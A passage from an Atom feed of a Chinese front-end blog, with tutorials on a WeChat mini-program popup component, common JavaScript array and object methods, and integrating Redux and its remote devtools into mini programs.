class="comment">//展示弹框</span></span><br><span class="line">    showPopup () &#123;</span><br><span class="line">      <span class="keyword">this</span>.setData(&#123;</span><br><span class="line">        flag: !<span class="keyword">this</span>.data.flag</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 内部私有方法建议以下划线开头</span></span><br><span class="line"><span class="comment">    * triggerEvent 用于触发事件</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    _error () &#123;</span><br><span class="line">      <span class="comment">//触发取消回调</span></span><br><span class="line">      <span class="keyword">this</span>.triggerEvent(<span class="string">"error"</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    _success () &#123;</span><br><span class="line">      <span class="comment">//触发成功回调</span></span><br><span class="line">      <span class="keyword">this</span>.triggerEvent(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>在首页用这个组件需要配置一下，首先建一个名为index.json的文件，里边配置”usingComponents”，就是需要引入到首页</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"usingComponents"</span>: &#123;</span><br><span class="line">    <span class="string">"popup"</span>: <span class="string">"/component/popup/popup"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>引入到首页</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--index.wxml--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"userinfo"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">"showPopup"</span>&gt;</span> 点我 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">popup</span> <span class="attr">id</span>=<span class="string">'popup'</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">title</span>=<span class="string">'小组件'</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">content</span>=<span class="string">'学会了吗'</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">btn_no</span>=<span class="string">'没有'</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">btn_ok</span>=<span class="string">'学会了'</span></span></span><br><span class="line"><span class="tag">      <span class="attr">bind:error</span>=<span class="string">"_error"</span>  </span></span><br><span class="line"><span class="tag">      <span class="attr">bind:success</span>=<span class="string">"_success"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">popup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>配置index.js操作点击事件</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="comment">//获取应用实例</span></span><br><span class="line"><span class="keyword">const</span> app = getApp()</span><br><span class="line"> </span><br><span class="line">Page(&#123;</span><br><span class="line">  onReady: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//获得popup组件</span></span><br><span class="line">    <span class="keyword">this</span>.popup = <span class="keyword">this</span>.selectComponent(<span class="string">"#popup"</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  showPopup() &#123;</span><br><span class="line">    <span class="keyword">this</span>.popup.showPopup();</span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//取消事件</span></span><br><span class="line">  _error() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'你点击了取消'</span>);</span><br><span class="line">    <span class="keyword">this</span>.popup.hidePopup();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//确认事件</span></span><br><span class="line">  _success() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'你点击了确定'</span>);</span><br><span class="line">    <span class="keyword">this</span>.popup.hidePopup();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、创建自定义组件&quot;&gt;&lt;a href=&quot;#一、创建自定义组件&quot; class=&quot;headerlink&quot; title=&quot;一、创建自定义组件&quot;&gt;&lt;/a&gt;一、创建自定义组件&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;类似于页面，一个自定义组件由 &lt;code&gt;json&lt;/co
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="小程序" scheme="http://blog.poetries.top/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>业务中处理数据结构常用的JS方法</title>
    <link href="http://blog.poetries.top/2018/08/12/js-map-reduce-find-filter/"/>
    <id>http://blog.poetries.top/2018/08/12/js-map-reduce-find-filter/</id>
    <published>2018-08-12T11:11:43.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、由map、filter、reduce、find展开"><a href="#一、由map、filter、reduce、find展开" class="headerlink" title="一、由map、filter、reduce、find展开"></a>一、由map、filter、reduce、find展开</h2><p><strong>filter</strong></p><blockquote><p>filter方法可以筛除数组和类似结构中不满足条件的元素，并返回满足条件的元素组成的数组。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> integers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>];</span><br><span class="line"><span class="keyword">const</span> evenIntegers = integers.filter(<span class="function"><span class="params">i</span> =&gt;</span> i%<span class="number">2</span> === <span class="number">0</span>);</span><br><span class="line"><span class="comment">// evenIntegers的值为[2, 4, 6]</span></span><br></pre></td></tr></table></figure><p><strong>find</strong></p><blockquote><p>find返回数组或类似结构中满足条件的第一个元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> posts = [</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">title</span>: <span class="string">'Title 1'</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">title</span>: <span class="string">'Title 2'</span>&#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// 找出id为1的posts</span></span><br><span class="line"><span class="keyword">const</span> title = posts.find(<span class="function"><span class="params">p</span> =&gt;</span> p.id === <span class="number">1</span>).title;</span><br></pre></td></tr></table></figure><p><strong>map</strong></p><blockquote><p>map方法的作用在于处理流式数据，比如数组。我们可以把它想象成所有元素都要经过的一个转换器。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> integers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>];</span><br><span class="line"><span class="keyword">const</span> twoXIntegers = integers.map(<span class="function"><span class="params">i</span> =&gt;</span> i*<span class="number">2</span>);</span><br><span class="line"><span class="comment">// twoXIntegers现在是 [2, 4, 6, 8, 12, 14]，而integers不发生变化。</span></span><br></pre></td></tr></table></figure><p><strong>reduce</strong></p><blockquote><p>当你想要将多个数据放进一个实例中时，你可以使用一个reducer</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> posts = [</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">upVotes</span>: <span class="number">2</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">upVotes</span>: <span class="number">89</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">upVotes</span>: <span class="number">1</span>&#125;</span><br><span class="line">];</span><br><span class="line"><span class="keyword">const</span> totalUpvotes = posts.reduce(<span class="function">(<span class="params">totalUpvotes, currentPost</span>) =&gt;</span>     </span><br><span class="line">  totalUpvotes + currentPost.upVotes, <span class="comment">//reducer函数</span></span><br><span class="line">  <span class="number">0</span> <span class="comment">// 初始化投票数为0</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">console</span>.log(totalUpvotes)<span class="comment">//输出投票总数：92</span></span><br></pre></td></tr></table></figure><ul><li>传给<code>reduce</code>的第一个参数函数还可以增加2个参数：</li><li>第三个参数：每个元素在原数据结构中的位置，比如数组下标。</li><li>第四个参数：调用reduce方法的数据集合，比如例子中的posts</li></ul><p><strong>some</strong></p><blockquote><p>some找到数组中符合条件的一项就不会在找，类似于<code>find</code>只找第一项</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1,2,3,4,5].some(v=&gt;v&gt;4) // true 符合有某一项满足条件</span><br></pre></td></tr></table></figure><p><strong>every</strong></p><blockquote><p><code>every</code>数组中每个条件都为真才会返回真</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1,2,3,4,5].every(v=&gt;v&gt;1) // false 数组中每一项都大于1才会返回true</span><br></pre></td></tr></table></figure><h2 id="二、向对象数组添加新元素"><a href="#二、向对象数组添加新元素" class="headerlink" title="二、向对象数组添加新元素"></a>二、向对象数组添加新元素</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> books = [];</span><br><span class="line"><span class="keyword">const</span> newBook = &#123;<span class="attr">title</span>: <span class="string">'Alice in wonderland'</span>, <span class="attr">id</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> updatedBooks = [...books, newBook];</span><br><span class="line"><span class="comment">//updatedBooks的值为[&#123;title: 'Alice in wonderland', id: 1&#125;]</span></span><br></pre></td></tr></table></figure><h2 id="三、为一个数组创建视图"><a href="#三、为一个数组创建视图" class="headerlink" title="三、为一个数组创建视图"></a>三、为一个数组创建视图</h2><blockquote><p>如果需要实现用户从购物车中删除物品，但是又不想破坏原来的购物车列表，可以使用filter方法</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> myId = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">const</span> userIds = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">6</span>];</span><br><span class="line"><span class="keyword">const</span> allButMe = userIds.filter(<span class="function"><span class="params">id</span> =&gt;</span> id !== myId);</span><br><span class="line"><span class="comment">// allButMe is [1, 5, 7, 3]</span></span><br></pre></td></tr></table></figure><h2 id="四、向数组中新增元素"><a href="#四、向数组中新增元素" class="headerlink" title="四、向数组中新增元素"></a>四、向数组中新增元素</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> books = [<span class="string">'Positioning by Trout'</span>, <span class="string">'War by Green'</span>];</span><br><span class="line"><span class="keyword">const</span> newBooks = [...books, <span class="string">'HWFIF by Carnegie'</span>];</span><br><span class="line"><span class="comment">// newBooks are now ['Positioning by Trout', 'War by Green', 'HWFIF // by Carnegie']</span></span><br></pre></td></tr></table></figure><h2 id="五、为对象新增一组键值对"><a href="#五、为对象新增一组键值对" class="headerlink" title="五、为对象新增一组键值对"></a>五、为对象新增一组键值对</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">name</span>: <span class="string">'Shivek Khurana'</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> updatedUser = &#123;...user, <span class="attr">age</span>: <span class="number">23</span>&#125;;</span><br><span class="line"><span class="comment">//updatedUser的值为：&#123;name: 'Shivek Khurana', age: 23&#125;</span></span><br></pre></td></tr></table></figure><h2 id="六、使用变量作为键名为对象添加键值对"><a href="#六、使用变量作为键名为对象添加键值对" class="headerlink" title="六、使用变量作为键名为对象添加键值对"></a>六、使用变量作为键名为对象添加键值对</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dynamicKey = <span class="string">'wearsSpectacles'</span>;</span><br><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">name</span>: <span class="string">'Shivek Khurana'</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> updatedUser = &#123;...user, [dynamicKey]: <span class="literal">true</span>&#125;;</span><br><span class="line"><span class="comment">// updatedUser is &#123;name: 'Shivek Khurana', wearsSpectacles: true&#125;</span></span><br></pre></td></tr></table></figure><h2 id="七、修改数组中满足条件的元素对象"><a href="#七、修改数组中满足条件的元素对象" class="headerlink" title="七、修改数组中满足条件的元素对象"></a>七、修改数组中满足条件的元素对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> posts = [</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">title</span>: <span class="string">'Title 1'</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">title</span>: <span class="string">'Title 2'</span>&#125;</span><br><span class="line">];</span><br><span class="line"><span class="keyword">const</span> updatedPosts = posts.map(<span class="function"><span class="params">p</span> =&gt;</span> p.id !== <span class="number">1</span> ?</span><br><span class="line">  p : &#123;...p, <span class="attr">title</span>: <span class="string">'Updated Title 1'</span>&#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">updatedPosts is now </span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">  &#123;id: 1, title: 'Updated Title 1'&#125;,</span></span><br><span class="line"><span class="comment">  &#123;id: 2, title: 'Title 2'&#125;</span></span><br><span class="line"><span class="comment">];</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="八、找出数组中满足条件的元素"><a href="#八、找出数组中满足条件的元素" class="headerlink" title="八、找出数组中满足条件的元素"></a>八、找出数组中满足条件的元素</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> posts = [</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">title</span>: <span class="string">'Title 1'</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">title</span>: <span class="string">'Title 2'</span>&#125;</span><br><span class="line">];</span><br><span class="line"><span class="keyword">const</span> postInQuestion = posts.find(<span class="function"><span class="params">p</span> =&gt;</span> p.id === <span class="number">2</span>);</span><br><span class="line"><span class="comment">// postInQuestion now holds &#123;id: 2, title: 'Title 2'&#125;</span></span><br></pre></td></tr></table></figure><h2 id="九、删除目标对象的一组属性"><a href="#九、删除目标对象的一组属性" class="headerlink" title="九、删除目标对象的一组属性"></a>九、删除目标对象的一组属性</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法一</span></span><br><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">name</span>: <span class="string">'Shivek Khurana'</span>, <span class="attr">age</span>: <span class="number">23</span>, <span class="attr">password</span>: <span class="string">'SantaCl@use'</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> userWithoutPassword = <span class="built_in">Object</span>.keys(user)</span><br><span class="line">  .filter(<span class="function"><span class="params">key</span> =&gt;</span> key !== <span class="string">'password'</span>)</span><br><span class="line">  .map(<span class="function"><span class="params">key</span> =&gt;</span> &#123;[key]: user[key]&#125;)</span><br><span class="line">  .reduce(<span class="function">(<span class="params">accumulator, current</span>) =&gt;</span> </span><br><span class="line">    (&#123;...accumulator, ...current&#125;),</span><br><span class="line">    &#123;&#125;</span><br><span class="line">  )</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">name</span>: <span class="string">'Shivek Khurana'</span>, <span class="attr">age</span>: <span class="number">23</span>, <span class="attr">password</span>: <span class="string">'SantaCl@use'</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> userWithoutPassword = <span class="function">(<span class="params">(&#123;name, age&#125;</span>) =&gt;</span> (&#123;name, age&#125;))(user);</span><br><span class="line"></span><br><span class="line"><span class="comment">// userWithoutPassword becomes &#123;name: 'Shivek Khurana', age: 23&#125;</span></span><br></pre></td></tr></table></figure><h2 id="十、将对象转化成请求串"><a href="#十、将对象转化成请求串" class="headerlink" title="十、将对象转化成请求串"></a>十、将对象转化成请求串</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> params = &#123;<span class="attr">color</span>: <span class="string">'red'</span>, <span class="attr">minPrice</span>: <span class="number">8000</span>, <span class="attr">maxPrice</span>: <span class="number">10000</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> query = <span class="string">'?'</span> + <span class="built_in">Object</span>.keys(params)</span><br><span class="line">  .map(<span class="function"><span class="params">k</span> =&gt;</span>   </span><br><span class="line">    <span class="built_in">encodeURIComponent</span>(k) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(params[k])</span><br><span class="line">  )</span><br><span class="line">  .join(<span class="string">'&amp;'</span>)</span><br><span class="line">;</span><br><span class="line"><span class="comment">// encodeURIComponent将对特殊字符进行编码。</span></span><br><span class="line"><span class="comment">// query is now "color=red&amp;minPrice=8000&amp;maxPrice=10000"</span></span><br></pre></td></tr></table></figure><h2 id="十一、获取数组中某一对象的下标"><a href="#十一、获取数组中某一对象的下标" class="headerlink" title="十一、获取数组中某一对象的下标"></a>十一、获取数组中某一对象的下标</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> posts = [</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">13</span>, <span class="attr">title</span>: <span class="string">'Title 221'</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">5</span>, <span class="attr">title</span>: <span class="string">'Title 102'</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">131</span>, <span class="attr">title</span>: <span class="string">'Title 18'</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>: <span class="number">55</span>, <span class="attr">title</span>: <span class="string">'Title 234'</span>&#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// 找到id为131的元素</span></span><br><span class="line"><span class="keyword">const</span> requiredIndex = posts.findIndex(<span class="function"><span class="params">obj</span>=&gt;</span>obj.id===<span class="number">131</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、由map、filter、reduce、find展开&quot;&gt;&lt;a href=&quot;#一、由map、filter、reduce、find展开&quot; class=&quot;headerlink&quot; title=&quot;一、由map、filter、reduce、find展开&quot;&gt;&lt;/a&gt;一、由ma
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://blog.poetries.top/tags/JavaScript/"/>
    
      <category term="API" scheme="http://blog.poetries.top/tags/API/"/>
    
  </entry>
  
  <entry>
    <title>在小程序中集成redux/immutable/thunk第三方库</title>
    <link href="http://blog.poetries.top/2018/08/11/wx-redux/"/>
    <id>http://blog.poetries.top/2018/08/11/wx-redux/</id>
    <published>2018-08-11T05:30:43.000Z</published>
    <updated>2018-08-23T01:41:37.491Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><blockquote><p>小程序给我们暴露了两个参数<code>require</code>和<code>module</code>，<code>require</code>用来在模块中加载其他模块，<code>module</code>用来将模块中的方法暴露出去</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>所以只要需要让第三方库的代码使用这种形式的<code>export</code>就可以了</p></blockquote><h3 id="二、构建Redux的微信小程序包"><a href="#二、构建Redux的微信小程序包" class="headerlink" title="二、构建Redux的微信小程序包"></a>二、构建Redux的微信小程序包</h3><blockquote><p>打一个<code>Redux</code>包，让它可以兼容微信小城的加载方式</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/reactjs/redux.git</span><br><span class="line"></span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 详细内容可以到redux项目的package.json中查看</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这些命令是是使用webpack构建UMD模式的包。也就是说所有的代码，包括依赖的库都会被打包到一个文件中，并且自带一段模块加载代码，文件可以在dist目录下找到</span></span><br><span class="line">npm run build:umd &amp;&amp; npm run build:umd</span><br></pre></td></tr></table></figure><blockquote><p>用编辑器打开<code>dist</code>目录下的<code>redux.js</code>文件</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">webpackUniversalModuleDefinition</span>(<span class="params">root, factory</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> exports === <span class="string">'object'</span> &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">module</span> === <span class="string">'object'</span>)</span><br><span class="line">        <span class="built_in">module</span>.exports = factory();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> define === <span class="string">'function'</span> &amp;&amp; define.amd)</span><br><span class="line">        define([], factory);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> exports === <span class="string">'object'</span>)</span><br><span class="line">        exports[<span class="string">"Redux"</span>] = factory();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        root[<span class="string">"Redux"</span>] = factory();</span><br><span class="line">&#125;)(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">...  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>这段代码是用来加载模块的，里面的factory函数的返回的内容是用webpack提供的loader组织起来的redux的代码和第三方依赖。</li><li>如果我们把这个文件拷贝到小程序中，只需要让程序能正常进入第三行代码，就能把Redux加载进来</li><li>将第二行代码：<code>if(typeof exports === &#39;object&#39; &amp;&amp; typeof module === &#39;object&#39;)</code> 修改成：<code>if(typeof module === &#39;object&#39;)</code></li><li>这样修改的原因是，在微信小程序的环境中是没有exports变量的，所以就没办法正确进入这个分支，删除之后就可以正确进入</li><li>我们拷贝到<code>libs</code>目录下，那么我们在程序中使用时，只要当做是一个本地模块去<code>require</code>就可以了 <code>var redux = require(&#39;./libs/redux.js&#39;)</code></li><li>我们可以通过类似的方法，使用<code>Webpack</code>打包第三方库，就可以集成任何库了</li></ul><h3 id="三、集成Redux-devtools"><a href="#三、集成Redux-devtools" class="headerlink" title="三、集成Redux-devtools"></a>三、集成Redux-devtools</h3><blockquote><p>因为微信小程序的开发环境是定制的，暂时没有发现办法直接安装<code>redux-devtool</code>的插件</p></blockquote><p><strong>安装remote-redux-devtools</strong></p><ul><li>原版的<code>remote-redux-devtools</code>使用的一个<code>websocket</code>的依赖会使用原生的<code>WebSocket</code>，小程序是不支持的，所以需要改成小程序的<code>websocket</code>实现,修改好的代码 <a href="https://github.com/poetries/wx-redux-immutable-template/blob/master/wx-redux-immutable-template/public/libs/remote-redux-devtools.js" target="_blank" rel="noopener">https://github.com/poetries/wx-redux-immutable-template/blob/master/wx-redux-immutable-template/public/libs/remote-redux-devtools.js</a></li><li>把代码下载到工程目录里面就可以用了</li></ul><p><strong>安装和启动remotedev-server</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g remotedev-server</span><br><span class="line">remotedev --hostname=localhost --port=5678</span><br></pre></td></tr></table></figure><blockquote><p>因为没办法用<code>npm</code>安装到本地（微信小程序会尝试去加载项目目录中的所有js），所以这里使用全局安装，第二条命令是启动<code>remotedev-server</code>，<code>hostname</code>和<code>port</code>分别指定为<code>localhost</code>和<code>5678</code></p></blockquote><p><strong>集成devtool</strong></p><blockquote><p>在<code>store</code>下集成<code>devtool</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;createStore, compose&#125; = <span class="built_in">require</span>(<span class="string">'./libs/redux.js'</span>);</span><br><span class="line"><span class="keyword">const</span> devTools = <span class="built_in">require</span>(<span class="string">'./libs/remote-redux-devtools.js'</span>).default;</span><br><span class="line"><span class="keyword">const</span> reducer = <span class="built_in">require</span>(<span class="string">'./reducers/index.js'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">configureStore</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> createStore(reducer, compose(devTools(&#123;</span><br><span class="line">    hostname: <span class="string">'localhost'</span>,</span><br><span class="line">    port: <span class="number">5678</span>,</span><br><span class="line">    secure: <span 